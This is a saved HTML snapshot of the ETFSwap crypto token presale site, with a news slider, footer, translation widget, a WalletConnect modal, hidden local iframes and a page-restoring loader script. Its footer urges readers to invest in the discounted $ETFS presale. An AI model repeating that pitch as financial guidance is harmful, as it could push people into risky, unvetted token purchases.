+                                <div class="feed-img"><img loading="lazy" src="gen20-506389-536690.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">FTX, Alameda Ordered to Pay $12.7B to Creditors by U.S. Judge
+                                  </h3>
+                                  <p class="news_para">United States District Judge Peter Castel passed the approval on
+                                    August 7, a filing shows. It did not seek a civil monetary penalty.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="16" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen13-506535-536675.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Bitstamp and Stripe Collaborate for EU Crypto Onramp</h3>
+                                  <p class="news_para">Crypto exchange Bitstamp is collaborating with Stripe, a
+                                    financial infrastructure platform, to support Stripe's fiat-to-crypto onramp across
+                                    the EU. This collaboration enables EU consumers to easily purchase cryptocurrencies
+                                    through a customizable widget that developers can embed in apps or websites. This
+                                    widget offers a seamless checkout experience optimized for cryptocurrency conversion
+                                    and instant settlement.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="17" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen3-506626-536639.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">New York judge nods $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="18" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="gen6-506603-536684.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">NY judge approves $12.7B settlement between FTX, Alameda and
+                                    CFTC</h3>
+                                  <p class="news_para">United States District Judge Peter Castel has officially signed
+                                    off on a settlement between FTX and the commodities regulator, meaning $12.7 billion
+                                    will be paid back to FTX creditors.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="19" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 324px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="feed-item">
+                                <div class="feed-img"><img loading="lazy" src="crypto43-536910.jpg" alt="News image"
+                                    class="img-fluid"></div>
+                                <div class="feed-des">
+                                  <h3 class="news_head">Zimbabwe to Unveil De-Dollarization Roadmap, Says Government
+                                    Official</h3>
+                                  <p class="news_para">The Zimbabwean Cabinet has approved a de-dollarization roadmap
+                                    outlining “modalities to operationalize the Zig currency as legal tender for use in
+                                    the economy.” Zimbabwean officials have set early 2026 as the new deadline for
+                                    making the Zig the country's sole currency.</p>
+                                  <p class="d-flex flex-column mb-0"><span>4 months ago <a
+                                        href="#"
+                                        target="_blank">Read more</a> </span></p>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="slick-arrow slick-next"><img fetchpriority="high" src="Group186.png" alt="Left"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+      <footer class="footer">
+        <div class="container">
+          <div class="footer-content">
+            <div class="row">
+              <div class="col-12 col-md-12 col-lg-6">
+                <div class="footer-left">
+                  <div class="footer-logo"><img loading="lazy" src="logo.png" alt="ETFSwap logo" class="img-fluid">
+                  </div>
+                  <p class="description">ETFSwap is a decentralized trading platform which enables you to swap crypto
+                    with listed ETFs. Also stake your tokens in our protocol and start earning an income. Invest in our
+                    $ETFS presale to take advantage of the discounted price and be part of the crypto ETF growth.</p>
+                </div>
+              </div>
+              <div class="col-12 col-md-12 col-lg-6">
+                <div class="footer-right text-right">
+                  <div class="left">
+                    <ul>
+                      <li><a href="">Buy $ETFS</a></li>
+                      <li><a href="https://etfswap.gitbook.io/whitepaper/" target="_blank"
+                          aria-label="Whitepaper">Whitepaper</a></li>
+                    </ul>
+                  </div>
+                  <div class="right">
+                    <h3>Connect with us</h3>
+                    <ul>
+                      <li><a href="# target="_blank" aria-label="instagram"><img
+                            loading="lazy" src="insta.png" alt="Instagram icon" class="img-fluid" width="25"
+                            height="25"></a></li>
+                      <li><a href="#p" target="_blank" aria-label="twitter"><img loading="lazy"
+                            src="twitter.png" alt="Twitter icon" class="img-fluid" width="25" height="25"></a></li>
+                      <li><a class="telegram-icon" href="#" target="_blank"
+                          aria-label="telegram"><img loading="lazy" src="telegram.png" alt="Telegram icon"
+                            class="img-fluid" width="25" height="25"></a></li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="bottom_support_mail">
+                  <p class="text-light description">For support related questions please email us on <a
+                      href="mailto:support@etfswappresale.com">support@etfswappresale.com</a></p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="copyright">
+            <div class="row">
+              <div class="col-12 col-md-12 col-lg-6">
+                <div class="left-copy">
+                  <p>Copyright © 2024 ETFSwaps Company All rights reserved.</p>
+                </div>
+              </div>
+              <div class="col-12 col-md-12 col-lg-6">
+                <ul>
+                  <li><a href="#" target="_blank">Privacy policy</a></li>
+                  <li><a href="#" target="_blank">Terms and conditions</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </footer>
+      <div>
+        <div class="gtranslate_wrapper gt_container--c8la1f"><!-- GTranslate: https://gtranslate.com -->
+          <div id="google_translate_element2"></div>
+          <div id="gt_float_wrapper" style="position:fixed;bottom:20px;right:20px;z-index:999999;">
+            <div class="gt_float_switcher notranslate" style="opacity: 1;">
+              <div class="gt_options" style="display:none"><a href="#" class="nturl" data-gt-lang="af"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/af.svg" alt="af"> Afrikaans</a><a href="#"
+                  class="nturl" data-gt-lang="sq"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sq.svg"
+                    alt="sq"> Albanian</a><a href="#" class="nturl" data-gt-lang="am"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/am.svg" alt="am"> Amharic</a><a href="#"
+                  class="nturl" data-gt-lang="ar"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ar.svg"
+                    alt="ar"> Arabic</a><a href="#" class="nturl" data-gt-lang="hy"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/hy.svg" alt="hy"> Armenian</a><a href="#"
+                  class="nturl" data-gt-lang="az"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/az.svg"
+                    alt="az"> Azerbaijani</a><a href="#" class="nturl" data-gt-lang="eu"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/eu.svg" alt="eu"> Basque</a><a href="#"
+                  class="nturl" data-gt-lang="be"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/be.svg"
+                    alt="be"> Belarusian</a><a href="#" class="nturl" data-gt-lang="bn"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/bn.svg" alt="bn"> Bengali</a><a href="#"
+                  class="nturl" data-gt-lang="bs"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/bs.svg"
+                    alt="bs"> Bosnian</a><a href="#" class="nturl" data-gt-lang="bg"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/bg.svg" alt="bg"> Bulgarian</a><a href="#"
+                  class="nturl" data-gt-lang="ca"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ca.svg"
+                    alt="ca"> Catalan</a><a href="#" class="nturl" data-gt-lang="ceb"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ceb.svg" alt="ceb"> Cebuano</a><a href="#"
+                  class="nturl" data-gt-lang="ny"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ny.svg"
+                    alt="ny"> Chichewa</a><a href="#" class="nturl" data-gt-lang="zh-CN"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/zh-CN.svg" alt="zh-CN"> Chinese
+                  (Simplified)</a><a href="#" class="nturl" data-gt-lang="zh-TW"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/zh-TW.svg" alt="zh-TW"> Chinese
+                  (Traditional)</a><a href="#" class="nturl" data-gt-lang="co"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/co.svg" alt="co"> Corsican</a><a href="#"
+                  class="nturl" data-gt-lang="hr"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/hr.svg"
+                    alt="hr"> Croatian</a><a href="#" class="nturl" data-gt-lang="cs"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/cs.svg" alt="cs"> Czech</a><a href="#"
+                  class="nturl" data-gt-lang="da"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/da.svg"
+                    alt="da"> Danish</a><a href="#" class="nturl" data-gt-lang="nl"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/nl.svg" alt="nl"> Dutch</a><a href="#"
+                  class="nturl gt-current" data-gt-lang="en"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/en.svg" alt="en"> English</a><a href="#"
+                  class="nturl" data-gt-lang="eo"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/eo.svg"
+                    alt="eo"> Esperanto</a><a href="#" class="nturl" data-gt-lang="et"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/et.svg" alt="et"> Estonian</a><a href="#"
+                  class="nturl" data-gt-lang="tl"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/tl.svg"
+                    alt="tl"> Filipino</a><a href="#" class="nturl" data-gt-lang="fi"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/fi.svg" alt="fi"> Finnish</a><a href="#"
+                  class="nturl" data-gt-lang="fr"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/fr.svg"
+                    alt="fr"> French</a><a href="#" class="nturl" data-gt-lang="fy"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/fy.svg" alt="fy"> Frisian</a><a href="#"
+                  class="nturl" data-gt-lang="gl"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/gl.svg"
+                    alt="gl"> Galician</a><a href="#" class="nturl" data-gt-lang="ka"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ka.svg" alt="ka"> Georgian</a><a href="#"
+                  class="nturl" data-gt-lang="de"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/de.svg"
+                    alt="de"> German</a><a href="#" class="nturl" data-gt-lang="el"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/el.svg" alt="el"> Greek</a><a href="#"
+                  class="nturl" data-gt-lang="gu"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/gu.svg"
+                    alt="gu"> Gujarati</a><a href="#" class="nturl" data-gt-lang="ht"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ht.svg" alt="ht"> Haitian Creole</a><a
+                  href="#" class="nturl" data-gt-lang="ha"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ha.svg" alt="ha"> Hausa</a><a href="#"
+                  class="nturl" data-gt-lang="haw"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/haw.svg"
+                    alt="haw"> Hawaiian</a><a href="#" class="nturl" data-gt-lang="iw"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/iw.svg" alt="iw"> Hebrew</a><a href="#"
+                  class="nturl" data-gt-lang="hi"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/hi.svg"
+                    alt="hi"> Hindi</a><a href="#" class="nturl" data-gt-lang="hmn"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/hmn.svg" alt="hmn"> Hmong</a><a href="#"
+                  class="nturl" data-gt-lang="hu"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/hu.svg"
+                    alt="hu"> Hungarian</a><a href="#" class="nturl" data-gt-lang="is"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/is.svg" alt="is"> Icelandic</a><a href="#"
+                  class="nturl" data-gt-lang="ig"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ig.svg"
+                    alt="ig"> Igbo</a><a href="#" class="nturl" data-gt-lang="id"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/id.svg" alt="id"> Indonesian</a><a href="#"
+                  class="nturl" data-gt-lang="ga"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ga.svg"
+                    alt="ga"> Irish</a><a href="#" class="nturl" data-gt-lang="it"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/it.svg" alt="it"> Italian</a><a href="#"
+                  class="nturl" data-gt-lang="ja"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ja.svg"
+                    alt="ja"> Japanese</a><a href="#" class="nturl" data-gt-lang="jw"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/jw.svg" alt="jw"> Javanese</a><a href="#"
+                  class="nturl" data-gt-lang="kn"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/kn.svg"
+                    alt="kn"> Kannada</a><a href="#" class="nturl" data-gt-lang="kk"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/kk.svg" alt="kk"> Kazakh</a><a href="#"
+                  class="nturl" data-gt-lang="km"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/km.svg"
+                    alt="km"> Khmer</a><a href="#" class="nturl" data-gt-lang="ko"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ko.svg" alt="ko"> Korean</a><a href="#"
+                  class="nturl" data-gt-lang="ku"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ku.svg"
+                    alt="ku"> Kurdish (Kurmanji)</a><a href="#" class="nturl" data-gt-lang="ky"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ky.svg" alt="ky"> Kyrgyz</a><a href="#"
+                  class="nturl" data-gt-lang="lo"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/lo.svg"
+                    alt="lo"> Lao</a><a href="#" class="nturl" data-gt-lang="la"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/la.svg" alt="la"> Latin</a><a href="#"
+                  class="nturl" data-gt-lang="lv"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/lv.svg"
+                    alt="lv"> Latvian</a><a href="#" class="nturl" data-gt-lang="lt"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/lt.svg" alt="lt"> Lithuanian</a><a href="#"
+                  class="nturl" data-gt-lang="lb"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/lb.svg"
+                    alt="lb"> Luxembourgish</a><a href="#" class="nturl" data-gt-lang="mk"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mk.svg" alt="mk"> Macedonian</a><a href="#"
+                  class="nturl" data-gt-lang="mg"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mg.svg"
+                    alt="mg"> Malagasy</a><a href="#" class="nturl" data-gt-lang="ms"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ms.svg" alt="ms"> Malay</a><a href="#"
+                  class="nturl" data-gt-lang="ml"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ml.svg"
+                    alt="ml"> Malayalam</a><a href="#" class="nturl" data-gt-lang="mt"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mt.svg" alt="mt"> Maltese</a><a href="#"
+                  class="nturl" data-gt-lang="mi"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mi.svg"
+                    alt="mi"> Maori</a><a href="#" class="nturl" data-gt-lang="mr"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mr.svg" alt="mr"> Marathi</a><a href="#"
+                  class="nturl" data-gt-lang="mn"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/mn.svg"
+                    alt="mn"> Mongolian</a><a href="#" class="nturl" data-gt-lang="my"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/my.svg" alt="my"> Myanmar (Burmese)</a><a
+                  href="#" class="nturl" data-gt-lang="ne"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ne.svg" alt="ne"> Nepali</a><a href="#"
+                  class="nturl" data-gt-lang="no"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/no.svg"
+                    alt="no"> Norwegian</a><a href="#" class="nturl" data-gt-lang="ps"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ps.svg" alt="ps"> Pashto</a><a href="#"
+                  class="nturl" data-gt-lang="fa"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/fa.svg"
+                    alt="fa"> Persian</a><a href="#" class="nturl" data-gt-lang="pl"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/pl.svg" alt="pl"> Polish</a><a href="#"
+                  class="nturl" data-gt-lang="pt"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/pt.svg"
+                    alt="pt"> Portuguese</a><a href="#" class="nturl" data-gt-lang="pa"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/pa.svg" alt="pa"> Punjabi</a><a href="#"
+                  class="nturl" data-gt-lang="ro"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ro.svg"
+                    alt="ro"> Romanian</a><a href="#" class="nturl" data-gt-lang="ru"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ru.svg" alt="ru"> Russian</a><a href="#"
+                  class="nturl" data-gt-lang="sm"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sm.svg"
+                    alt="sm"> Samoan</a><a href="#" class="nturl" data-gt-lang="gd"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/gd.svg" alt="gd"> Scottish Gaelic</a><a
+                  href="#" class="nturl" data-gt-lang="sr"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sr.svg" alt="sr"> Serbian</a><a href="#"
+                  class="nturl" data-gt-lang="st"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/st.svg"
+                    alt="st"> Sesotho</a><a href="#" class="nturl" data-gt-lang="sn"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sn.svg" alt="sn"> Shona</a><a href="#"
+                  class="nturl" data-gt-lang="sd"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sd.svg"
+                    alt="sd"> Sindhi</a><a href="#" class="nturl" data-gt-lang="si"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/si.svg" alt="si"> Sinhala</a><a href="#"
+                  class="nturl" data-gt-lang="sk"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sk.svg"
+                    alt="sk"> Slovak</a><a href="#" class="nturl" data-gt-lang="sl"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sl.svg" alt="sl"> Slovenian</a><a href="#"
+                  class="nturl" data-gt-lang="so"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/so.svg"
+                    alt="so"> Somali</a><a href="#" class="nturl" data-gt-lang="es"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/es.svg" alt="es"> Spanish</a><a href="#"
+                  class="nturl" data-gt-lang="su"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/su.svg"
+                    alt="su"> Sundanese</a><a href="#" class="nturl" data-gt-lang="sw"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sw.svg" alt="sw"> Swahili</a><a href="#"
+                  class="nturl" data-gt-lang="sv"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/sv.svg"
+                    alt="sv"> Swedish</a><a href="#" class="nturl" data-gt-lang="tg"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/tg.svg" alt="tg"> Tajik</a><a href="#"
+                  class="nturl" data-gt-lang="ta"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ta.svg"
+                    alt="ta"> Tamil</a><a href="#" class="nturl" data-gt-lang="te"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/te.svg" alt="te"> Telugu</a><a href="#"
+                  class="nturl" data-gt-lang="th"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/th.svg"
+                    alt="th"> Thai</a><a href="#" class="nturl" data-gt-lang="tr"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/tr.svg" alt="tr"> Turkish</a><a href="#"
+                  class="nturl" data-gt-lang="uk"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/uk.svg"
+                    alt="uk"> Ukrainian</a><a href="#" class="nturl" data-gt-lang="ur"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/ur.svg" alt="ur"> Urdu</a><a href="#"
+                  class="nturl" data-gt-lang="uz"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/uz.svg"
+                    alt="uz"> Uzbek</a><a href="#" class="nturl" data-gt-lang="vi"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/vi.svg" alt="vi"> Vietnamese</a><a href="#"
+                  class="nturl" data-gt-lang="cy"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/cy.svg"
+                    alt="cy"> Welsh</a><a href="#" class="nturl" data-gt-lang="xh"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/xh.svg" alt="xh"> Xhosa</a><a href="#"
+                  class="nturl" data-gt-lang="yi"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/yi.svg"
+                    alt="yi"> Yiddish</a><a href="#" class="nturl" data-gt-lang="yo"><img
+                    data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/yo.svg" alt="yo"> Yoruba</a><a href="#"
+                  class="nturl" data-gt-lang="zu"><img data-gt-lazy-src="https://cdn.gtranslate.net/flags/svg/zu.svg"
+                    alt="zu"> Zulu</a></div>
+              <div class="gt-selected">
+                <div class="gt-current-lang"><img src="en.svg" alt="en"> <span class="gt-lang-code">en</span> <span
+                    class="gt_float_switcher-arrow"></span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZF6L2JWFB8"></script>
+    <script defer>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-ZF6L2JWFB8");
+    </script>
+    <script defer>
+      //if browser support service worker
+      if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("serviceWorker.js");
+      }
+    </script>
+    
+    <script defer type="text/javascript" id="zsiqchat">
+      var $zoho = $zoho || {};
+      $zoho.salesiq = $zoho.salesiq || { widgetcode: "siq674a56f7be3bedfb814559fa7f662104ba0b5e92d0c5d8eae6c5458a27a19894", values: {}, ready: function () {} };
+      var d = document;
+      s = d.createElement("script");
+      s.type = "text/javascript";
+      s.id = "zsiqscript";
+      s.defer = true;
+      s.src = "https://salesiq.zohopublic.eu/widget";
+      t = d.getElementsByTagName("script")[0];
+      t.parentNode.insertBefore(s, t);
+    </script> -->
+
+  <!-- <div class="gtranslate_wrapper"></div>
+    <script defer>
+      window.gtranslateSettings = { default_language: "en", wrapper_selector: ".gtranslate_wrapper", switcher_horizontal_position: "right" };
+    </script>
+    <script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer charset="UTF-8"></script>
+    
+     -->
+  <!-- <script>
+      // Define the onScroll function
+      let lastScrollY = 0;
+      let scheduledAnimationFrame = false;
+
+      function onScroll(evt) {
+        lastScrollY = window.scrollY;
+
+        if (scheduledAnimationFrame) return;
+
+        scheduledAnimationFrame = true;
+        requestAnimationFrame(readAndUpdatePage);
+      }
+
+      function readAndUpdatePage() {
+        scheduledAnimationFrame = false;
+      }
+
+      // Attach the scroll event listener to the window
+      window.addEventListener("scroll", onScroll);
+    </script> -->
+
+
+  <iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"
+    src="index_1.html"></iframe>
+
+  <iframe id="verify-api" src="index_3.html" style="display: none;"></iframe><wcm-modal
+    data-scrapbook-adoptedstylesheets="0,1"
+    data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$391376492$--></div></div>"></wcm-modal>
+  <div class="zsiq_floatmain zsiq_theme1 siq_bR" data-id="zsalesiq" style="visibility: hidden; display: block;">
+    <div id="zsiq_float" class="zsiq_float " style="font-family:inherit">
+      <div class="zsiq_flt_rel"><em id="zsiq_agtpic" class="zsiq_user siqicon siqico-chat"></em>
+        <div id="titlediv" class="zsiq_cnt">
+          <div id="zsiq_maintitle" class="zsiq_ellips" title="We're Online!">We're Online!</div>
+          <p id="zsiq_byline" class="zsiq_ellips" title="How may I help you today?">How may I help you today?</p><em
+            class="siqico-close"></em>
+        </div><em id="zsiq_unreadcnt" class="zsiq_unrdcnt" style="display: none;"></em><em id="zsiq_avcall"
+          class="zsiqmin_unrdcnt zsiq_unrdcnt siqico-mincall" style="display: none;"></em>
+      </div>
+    </div>
+  </div>
+  <style id="zsiqcustomcss" data-id="zsalesiq">
+    .zsiq_flt_rel {
+      background-color: #0066cc !important;
+    }
+
+    .zsiq_seasonal .st2 {
+      fill: #0066cc !important;
+    }
+  </style>
+  <div class="zls-sptwndw  siqembed siqtrans siqhide zsiq-mobhgt zsiq-newtheme siq_rht zsiq_size2" embedtheme="8"
+    data-id="zsiqembed" style="visibility: hidden; top: -10000px; display: block;">
+    <div id="siqcht" class="zls-prelative"><iframe id="siqiframe" title="SalesIQ Chatwindow" seamless="seamless"
+        height="460" width="100%" scrolling="no" src="index_2.html"></iframe></div>
+  </div>
+  <script
+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/; k18 = '/scrapbook-slot-index'; d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { e.assign.apply(e, d); } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(','); for (i = 0, I = l.length; i < I; 